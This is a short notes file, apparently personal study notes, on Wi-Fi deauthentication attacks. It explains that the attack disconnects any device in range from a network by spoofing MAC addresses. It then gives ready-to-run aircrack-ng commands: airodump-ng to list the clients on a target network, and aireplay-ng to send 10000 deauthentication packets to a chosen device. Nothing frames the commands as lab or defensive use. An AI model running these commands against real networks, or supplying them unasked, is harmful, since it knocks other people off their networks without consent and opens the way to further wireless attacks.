//Deauthentication
- Is used to disconnect any device form any network within your range without the network key.
- Is done by pretending to be the target machine by spoofing its MAC address (pretending to be the target machine)
- Meanwhile sending packets to the target machine (as the router) that it need to re-authenticate itself

//To see which clients are currently connected
airodump-ng --channel (CHANNELOFNETWORK) --bssid (MACADRESSSOFNETWORK) mon0

//To deauth one of the devices
aireplay-ng --deauth 10000 -a (NETWORKMACADRESS) -c (DEVICEMACADRESS) mon0
